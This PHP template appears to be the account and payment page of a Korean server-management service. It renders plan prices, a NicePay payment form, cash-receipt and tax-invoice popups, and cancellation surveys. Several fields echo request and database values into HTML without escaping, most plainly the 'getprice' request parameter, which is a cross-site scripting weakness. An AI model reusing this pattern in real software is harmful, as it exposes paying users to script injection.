					<?php
                     $server_feature_arr = explode('@', $user_row['server_feature']);
                    for ($i = 0; $i < count($server_feature_arr) - 1; $i ++) {
                        ?>
							<li class="mu_nas"><span>0<?php echo $i+1?></span>
							<div class="mu_text"><?php echo $server_feature_arr[$i]?></div></li>
					<?php
                        }
                        ?>
					</ul>
					</p>
				</div>
				<!-- // cell 1 -->

				<!-- 초기 회원가입시 뮤자인 구축 N일시 + 된 가격 -->
				<?php

                if ($_SESSION['musign_yn'] == "N") {
                    ?>
    				<div class="cell cell2 service_c extend">
					<p class="myp-ptit">서비스선택</p>
					<ul>
						<li>
							<p class="myp-rchk">
								<input id="mypService1" type="radio" class='use_way mypservice' name="rchk1" value="" onclick="price_choose(this, 1);"> 
								<label for="mypService1" name="mypService1" value=""> 1년 이용권
									 <span name="getprice"><?php echo number_format($user_row['server_price']+110000)?>원</span>
								</label>
							</p>
						</li>
						<li>
							<p class="myp-rchk">
								<input id="mypService2" type="radio" class='use_way mypservice' name="rchk1" value="" onclick="price_choose(this, 2);"> 
								<label for="mypService2" name="mypService2" value=""> 2년 이용권
									<span name="getprice"><?php echo number_format($user_row['server_price']*2 + 110000)?>원</span>
								</label>
							</p>
						</li>
						<li>
							<p class="myp-rchk">
								<input id="mypService3" type="radio" class='use_way mypservice'
									name="rchk1" value="" onclick="price_choose(this, 3);"> <label
									for="mypService3" name="mypService3" value=""> 3년 이용권 <span
									name="getprice"><?php echo number_format($user_row['server_price']*3 + 110000)?>원</span>
								</label>
							</p>
						</li>
					</ul>
				</div>
				<?php
                } else {
                    ?>	
    				<div class="cell cell2 service_c extend">
					<p class="myp-ptit">서비스선택</p>
					<ul>
						<li>
							<p class="myp-rchk">
								<input id="mypService1" type="radio" class='use_way mypservice'
									name="rchk1" value="" onclick="price_choose(this, 1);">
								<label for ="mypService1" name="mypService1" value=""> 1년 이용권 <span
									name="getprice"><?php echo number_format($user_row['server_price'])?>원</span>
								</label>
							
							</p>
						</li>
						<li>
							<p class="myp-rchk">
								<input id="mypService2" type="radio" class='use_way mypservice'
									name="rchk1" value="" onclick="price_choose(this, 2);"> <label
									for="mypService2" name="mypService2" value=""> 2년 이용권 <span
									name="getprice"><?php echo number_format($user_row['server_price']*2)?>원</span>
								</label>
							</p>
						</li>
						<li>
							<p class="myp-rchk">
								<input id="mypService3" type="radio" class='use_way mypservice'
									name="rchk1" value="" onclick="price_choose(this, 3);"> <label
									for="mypService3" name="mypService3" value=""> 3년 이용권 <span
									name="getprice"><?php echo number_format($user_row['server_price']*3)?>원</span>
								</label>
							</p>
						</li>
					</ul>
				</div>
				<?php
                }
                ?>
				<div class="cell cell1 wid-100 move">
					<p class="myp-ptit"><?php echo $server_row['server_type']?>의 특징
					<ul>
					<?php
                    $server_row_arr = explode('@', $server_row['server_feature']);
                    for ($i = 0; $i < count($server_row_arr) - 1; $i ++) {
                        ?>
                			<li class="mu_nas"><span>0<?php echo $i+1?></span>
                			<div class="mu_text"><?php echo $server_row_arr[$i]?></div></li>
					<?php
                    }
                    ?>
					</ul>
					</p>
				</div>
				<!-- 해지/이전 버튼 클릭시 -->
				<div class="cell cell2 service_c move">
					<p class="myp-ptit">서비스선택</p>
					<ul>
						<li>
							<p class="myp-rchk">
								<input id="mypService4" type="radio" class='use_way mypservice'
									name="rchk1" value="" onclick="price_choose(this, 1);"> <label
									for="mypService4" name="mypService4" value=""> 1년 해지/이전 비용 <span
									name="getprice"><?php echo number_format($server_row['server_price'])?>원</span>
								</label>
							</p>
						</li>
					</ul>
				</div>
				<!-- // cell 2 -->
			</div>
			<!-- // cellbox 1 -->

			<div class="payment">
				<p>
					결제 금액 <span class="pay"><?php echo number_format($user_row['server_price'])?></span>원
				</p>
			</div>
			<!-- // payment -->

			<script>
    				$(window).ready(function(){
    					$(".payment_wra").hide();
    					$("#finalBtn").click(function(){
    						$(".payment_wra").show();
    						$(this).text("결제하기");
    					});
    				});
    				
    				$(window).ready(function(){
    					$("#payment_progress ul li").click(function(){
    						var idx = $(this).index();
    						$("#payment_progress ul li").removeClass("on");
    						$(this).addClass("on");
    						
    						if ($("#payment_progress ul li").eq(0).hasClass("on"))
    						{
    							$("#payment_progress .import_txt").show();
    						}else{
    							$("#payment_progress .import_txt").hide();
    						}    
    					});

    					$('.cellbox-1 .myp-rchk').click(function(){
    						$('.cellbox-1 .tab_desc').css('display', 'inline-block');
    					});
    				});
    				
			</script>

			<div class="myp-grid bd-n payment_wra">
				<p class="myp-tit ">결제수단 선택 / 결제</p>
				<div id="payment_progress">
					<div class="inner">
						<div class="boxwra">
							<div class="cellbox- cellbox-0">
								<div class="cell cell1">
									<p class="tit">영수증 발급 신청</p>
								</div>
								<!-- // cell 1-->
								<div class="cell cell2">
									<div class="tabwra-">
										<ul>
											<li class="myp-rchk notapp_li"><input type="radio" id="1" class="" name="0"> <label for="1">미신청</label></li>
											<li class="myp-rchk cash_li"><input type="radio" id="2" class="" name="0"> <label for="2">현금영수증</label></li>
											<li class="myp-rchk bill_li"><input type="radio" id="3" class="" name="0"> <label for="3">세금계산서</label></li>
										</ul>
									</div>

									<div class="import_txt notapp_txt"></div>
								</div>
								<!-- // cell2 -->
							</div>
							<!-- // cellbox- -->

							<div class="cellbox- cellbox-1">
								<div class="cell cell1">
									<p class="tit">일반결제</p>
								</div>
								<!-- // cell 1-->
								<div class="cell cell2">
									<div class="tabwra-">
										<ul>
											<li class="myp-rchk"><input id="vbank" type="radio" class='mypservice pay_method' name="pay_method" value="VBANK" onclick="choose_paymethod('VBANK');"> 
											<label for="vbank">가상계좌</label></li>
											<li class="myp-rchk"><input id="card" type="radio" class='mypservice pay_method' name="pay_method" value="CARD" onclick="choose_paymethod('CARD');"> 
											<label for="card">신용카드</label></li>
											<li class="myp-rchk"><input id="bank" type="radio" class='mypservice pay_method' name="pay_method" value="BANK" onclick="choose_paymethod('BANK');"> 
											<label for="bank">계좌이체</label></li>
										</ul>
										<p class="tab_desc">* 결제 진행 후 취소 불가합니다.</p>
									</div>

									<div class="import_txt"></div>
								</div>
								<!-- // cell2 -->
							</div>
							<!-- // cellbox- -->
						</div>
						<!-- // boxwra -->
					</div>
					<!-- // payment_progress -->
				</div>
			</div>

			<div class="payment-final">
				<div class="cell cell1">
					<p class="final-chk">
						<input id="finalCheck" type="checkbox" name="finalCheck" style="display: none"> <label class="check_s" for="finalCheck">위
							상품의 구매조건 확인 및 결제진행에 동의합니다.</label>
					</p>
				</div>
				<div class="cell cell2">
					<button id="finalBtn" onclick="nicepayStart();">신청하기</button>
				</div>
			</div>
			<form name="payForm" id="payForm" method="post" action="/api_test_code/payResult_utf.php">
    			<input type="hidden" id="PayMethod" name="PayMethod" value="VBank">
    			<input type="hidden" id="goodsname" name="GoodsName"value="<?php echo $user_row['user_server']?>"> <br> 
    			<input type="hidden" id="Amt" name="Amt" value="<?php echo($price)?>"> <br>
    			<input type="hidden" id="chk_year" name="chk_year" value=""> <br> 
    			<input type="hidden" id="mid" name="MID" value="<?php echo($MID)?>"><br> 
    			<input type="hidden" id="moid" name="Moid" value="<?php echo($moid)?>"> <br>
    			<input type="hidden" id="buyername" name="BuyerName" value="<?php echo $user_row['user_name']?>"> <br> 
    			<input type="hidden" id="buyeremail" name="BuyerEmail" value="<?php echo($buyerEmail)?>"> <br> 
    			<input type="hidden" id="buyertel" name="BuyerTel" value="<?php echo($buyerTel)?>"> <br>
    			<input type="hidden" id="returnurl" name="ReturnURL" value="<?php echo($returnURL)?>"> <br> 
    			<input type="hidden" name="VbankExpDate" value=""><br> 
    			<input type="hidden" name="GoodsCl" value="1" /> <br> 
    			<input type="hidden" name="TransType" value="0" /> <br> 
    			<input type="hidden" name="CharSet" value="utf-8" /> <br> 
    			<input type="hidden" name="ReqReserved" value="" /> <br> 
    			<input type="hidden" name="FnCd" value="07" /> <br> 
    			<input type="hidden" name="FnName" value="현대" /> <br> 
    			<input type="hidden" name="CashRcptCl" value="1" /><br> 
    			<input type="hidden" name="OptionList" value="no_receipt" /> <br>
    			<input type="hidden" id="edidate" name="EdiDate" value="<?php echo($ediDate)?>" /> <br> 
    			<input type="hidden" id="signdata" name="SignData" value="<?php echo($hashString)?>" />
			</form>
		</div>
		<!-- // payment_final -->
	</div>
	<!-- // myp-service -->
</div>

<div class="mypage-div">
	<div class="myp-grid">
		<p class="myp-tit">Musign family care service</p>
		<div class="myp-service p010">
			<ul>
				<li><img src="/img/mypage_i1.png" alt="musgin"> 
				<strong>Server Management</strong>
					<p>서버 전담팀 운영<br> 맨투맨</p>
				</li>
				<li><img src="/img/mypage_i2.png" alt="musgin"> 
				<strong>Quick Reaction </strong>
					<p>긴급상황 대응</p>
				</li>
				<li><img src="/img/mypage_i3.png" alt="musgin"> 
				<strong>Free Installation</strong>
					<p>웹사이트 환경 무료 설치 지원</p>
				</li>
				<li><img src="/img/mypage_i4.png" alt="musgin"> 
				<strong>Installation Support</strong>
					<p>SSL 설치 지원 (SSL 구매비용 별도)</p>
				</li>
				<li><img src="/img/mypage_i5.png" alt="musgin"> 
				<strong>Installation Support</strong>
					<p>주기적 백업 지원</p>
				</li>
				<li><img src="/img/mypage_i6.png" alt="musgin"> 
				<strong>Server Previous</strong>
					<p>서버 및 DB 이전 지원</p>
				</li>
				<li><img src="/img/mypage_i7.png" alt="musgin"> 
				<strong>Version Management</strong>
					<p>소프트웨어 버전 최신화 관리</p>
				</li>
			</ul>
		</div>
	</div>
</div>

<!-- 현금영수증 팝업 -->
<div class="cancel-modify-popup cash-popup mypage_pop">
	<div class="cell">
		<div class="inner">
			<div class="cancel-modify-wrap">
				<form name="cashbillForm" id="cashbillForm" method="post"
					action="/Baro/BaroService_PHP5_Sample/CASHBILL/API_CASHBILL/RegistCashBill.php">
					<h2 class="popup_tit">현금 영수증 발급</h2>
					<h4 class="popup_subtit">현금 영수증 정보</h4>
					<table>
						<tr>
							<th>주문번호</th>
							<td><input type="text" id="cash_mgt_num" readonly class=""
								name="cash_mgt_num" value='<?php echo $cash_mgt_num?>'> <input
								type="hidden" id="user_idx" class="" name="user_idx"
								value='<?php echo $_SESSION['idx']?>'></td>
							<th>신청날짜</th>
							<td><input type="text" id="trade_date" name="trade_date" readonly
								class="" value='<?php echo $today?>'></td>
						</tr>
						<tr>
							<th>품목명</th>
							<td><input type="text" readonly class="" id="item_name"
								name="item_name" value='뮤자인케어 서비스 연간 결제'></td>
							<th>신청자명</th>
							<td><input type="text" class="notempty" id="franchise_ceoname"
								name="franchise_ceoname"
								value='<?php echo $user_row['user_name']?>'></td>
						</tr>
						<tr>
							<th>신청금액</th>
							<td><input type="text" id="amount" class="" name="amount"
								value='<?php echo $_REQUEST['getprice']?>'></td>
							<th>이메일</th>
							<td colspan="3"><input type="text" class="" id="email"
								name="email" value='<?php echo $user_row['user_email']?>'></td>
						</tr>
						<tr>
							<th>발행용도</th>
							<td colspan="3"><label class="radio_check_wrap"><input
									type="radio" id="trade_usage" name="trade_usage" value="1"
									class="radio_check" checked="checked">소득공제</label> <label
								class="radio_check_wrap"><input type="radio" id="trade_usage"
									name="trade_usage" value="2" class="radio_check">지출증빙</label></td>
						</tr>
						<tr>
							<th>인증종류</th>
							<td colspan="3" class="confirm_td"><label
								class="radio_check_wrap confirm_li"><input type="radio"
									id="trade_method" name="trade_method" value="4"
									class=" radio_check" checked="checked">사업자번호</label> <label
								class="radio_check_wrap confirm_li"><input type="radio"
									id="trade_method" name="trade_method" value="5"
									class="radio_check">휴대폰번호</label>
								<div class="confirm_area c_default">
									<span>사업자번호:</span> <input type="text" id="identity_b"
										class="txt_num empty notempty" name="identity_b">
									<!--  <input type="button" class="txt_num bt_num" onclick="chkcorp();" name="gochkcorp" value="조회"> -->
								</div>
								<div class="confirm_area">
									<span>휴대폰번호:</span> <input type="text" id="identity"
										class="empty" name="identity">
								</div></td>
						</tr>
					</table>
				</form>
				<div class="popup-btn-wrap">
					<a href="#" id="" onclick="send_cashbill();" class="popup-btn-1">발
						행</a><a class="cash_hide popup-close btn_blue popup-btn-2">취 소</a>
				</div>
			</div>
		</div>
	</div>
</div>

<!-- 세금계산서 팝업 -->
<div class="cancel-modify-popup bill-popup mypage_pop">
	<div class="cell">
		<div class="inner">
			<div class="cancel-modify-wrap">
				<form name="invoiceForm" id="invoiceForm" method="post" action="/Baro/BaroService_PHP5_Sample/TI/API_TI/RegistAndIssueTaxInvoice.php">
					<h2 class="popup_tit">세금 계산서 발급</h2>
					<h4 class="popup_subtit">세금 계산서 정보</h4>
					<table>
						<tr class="hidden">
							<td colspan="2"><input type="text" id="mgt_num" class="" name="mgt_num" value="<?php echo $mgt_num?>"> 
							<input type="text" id="cust_no" class="" name="cust_no" value="<?php echo $_SESSION['idx']?>"> 
							<input type="text" id="item" name="item" value='뮤자인케어 서비스 연간 비용'> 
							<input type="text" id="amount2" class="" name="amount2" value='<?php echo $_REQUEST['getprice']?>'></td>
						</tr>
						<tr>
							<th>사업자번호</th>
							<td><input type="text" class="notEmpty" id="corp_num" name="corp_num"></td>
							<th>상호</th>
							<td><input type="text" class="notEmpty" id="corp_name" name="corp_name"></td>
						</tr>
						<tr>
							<th>대표자 이름</th>
							<td><input type="text" class="notempty" id="ceo_name" name="ceo_name"></td>
							<th>주소</th>
							<td><input type="text" class="notempty" id="addr" name="addr" onclick="show_address();" readonly="readonly"></td>
						</tr>
						<tr>
							<th>업태</th>
							<td><input type="text" id="biz_type" name="biz_type" class="notempty"></td>
							<th>업종</th>
							<td><input type="text" id="biz_class" name="biz_class" class="notempty"></td>
						</tr>
						<tr>
							<th>담당자</th>
							<td><input type="text" id="contact_name" class="notempty" name="contact_name" value='<?php echo $user_row['user_name']?>'></td>
							<th>연락처</th>
							<td><input type="text" id="tel" class="notempty" name="tel" value='<?php echo $user_row['user_phone']?>'></td>
						</tr>
						<tr>
							<th>이메일</th>
							<td colspan="3"><input type="text" class="notempty" id="email" name="email" value='<?php echo $user_row['user_email']?>'></td>
						</tr>
					</table>
				</form>
				<div class="popup-btn-wrap">
					<a href="#" id="" onclick="send_invoice();" class="popup-btn-1">발 행</a><a class="bill_hide popup-close btn_blue popup-btn-2">취 소</a>
				</div>
			</div>
		</div>
	</div>
</div>

<!--  해지 버튼 클릭시 팝업 -->
<div class="cancel-modify-popup cancel-popup mypage_pop">
	<div class="cell">
		<div class="inner">
			<div class="cancel-modify-wrap">
				<form mehotd="POST" id="fncForm2" action="call_off_proc.php">
					<h2 class="popup_tit">서버관리운영 서비스 해지</h2>
					<h4 class="popup_subtit">1. 서비스 해지 사유를 선택해 주세요.</h4>
					<div class="popup_cont">
						<ul>
							<li><label><input type="radio" class="" name="query" value="1" customizedValue1="기존 서비스에 만족하지 못했습니다.">기존 서비스에 만족하지 못했습니다.</label></li>
							<li><label><input type="radio" class="" name="query" value="2" customizedValue1="타 서비스와 차별점을 느끼지 못했습니다.">타 서비스와 차별점을 느끼지 못했습니다.</label></li>
							<li><label><input type="radio" class="" name="query" value="3" customizedValue1="사유 없음">사유 없음</label></li>
							<li><label><input type="radio" class="notempty" name="query" value="4" customizedValue1="기타">기타 : <input type="text" name="other_content2" class="input_line"></label></li>
						</ul>
					</div>
					<h4 class="popup_subtit">2. Musigncare(서버관리운영 서비스)를 사용하시면서 아쉬운 점과 개선되어야 할 점이 있다면 편하게 남겨주세요.</h4>
					<div class="popup_cont">
						<ul>
							<li>내 답변 : <input type="text" name="my_content" class="input_line notempty"></label></li>
						</ul>
					</div>
				</form>
				<div class="popup-btn-wrap">
					<a href="#" id="" onclick="javascript:fncSubmit_call();" class="popup-btn-1">해지 신청하기</a>
					<!-- <a class="cancel_hide popup-close btn_blue popup-btn-2">해지취소</a> -->
				</div>
				<div class="close-btn cancel_hide" onclick="close_btn();">
					<img src="/img/close-btn-w.png" alt="닫기">
				</div>
			</div>
		</div>
	</div>
</div>


<?php
// 만약 해지/이전 및 해지 설문조사를 했다면 노출 x)
if ($user_row['call_of_why'] == null && $user_row['other_content'] == null && $user_row['other_content2'] == null && $user_row['hope_date'] == null && $user_row['hope_date2'] == null) {
    ?>
<!--  해지/이전 팝업 -->
<div class="cancel-modify-popup move-popup mypage_pop">
	<div class="cell">
		<div class="inner">
			<div class="cancel-modify-wrap myp-payment">

				<div class="qa_view">
					<form mehotd="POST" id="fncForm3" action="call_move_proc.php">
						<h2 class="popup_tit">서버관리운영 서비스 해지</h2>
						<h4 class="popup_subtit">1. 서비스 해지 사유를 선택해 주세요.</h4>
						<div class="popup_cont">
							<ul>
								<li><label><input type="radio" class="" name="query2" value="1"customizedValue2="기존 서비스에 만족하지 못했습니다.">기존 서비스에 만족하지 못했습니다.</label></li>
								<li><label><input type="radio" class="" name="query2" value="2" customizedValue2="타 서비스와 차별점을 느끼지 못했습니다.">타 서비스와 차별점을 느끼지 못했습니다.</label></li>
								<li><label><input type="radio" class="" name="query2" value="3"customizedValue2="사유 없음">사유 없음</label></li>
								<li><label><input type="radio" class="notempty" name="query2" value="4" customizedValue2="기타">기타 : <input type="text" name="other_content2" class="input_line"></label></li>
							</ul>
						</div>
						<h4 class="popup_subtit">2. Musigncare(서버 관리운영 서비스)를 사용하시면서 아쉬운 점과
							개선되어야 할 점이 있다면 편하게 남겨주세요.</h4>
						<div class="popup_cont">
							<ul>
								<li>내 답변 : <input type="text" name="my_content" class="input_line notempty"></label></li>
							</ul>
						</div>
						<h4 class="popup_subtit">3. 해지/이전 희망 날짜</h4>
						<div class="popup_cont">
							<ul>
								<li>희망 날짜 1 : <input type="text" name="hope_date" class="input_line notempty" id="datepicker"></label></li>
								<br />
								<li>희망 날짜 2 : <input type="text" name="hope_date2" class="input_line notempty" id="datepicker2"></label></li>
							</ul>
						</div>
					</form>
					<div class="popup-btn-wrap">
						<a href="#service_ch" id="" onclick="javascript:fncSubmit_Move();" class="popup-btn-1">결제하기</a>
						<!-- <a class="move_hide popup-close btn_blue popup-btn-2">해지/이전 취소</a> -->
					</div>
				</div>
				<div class="close-btn move_hide" onclick="close_btn();">
					<img src="/img/close-btn-w.png" alt="닫기">
				</div>
			</div>
		</div>
	</div>
</div>
<?php
}
?>

<?php require_once($_SERVER['DOCUMENT_ROOT']."/common/footer.php"); ?>
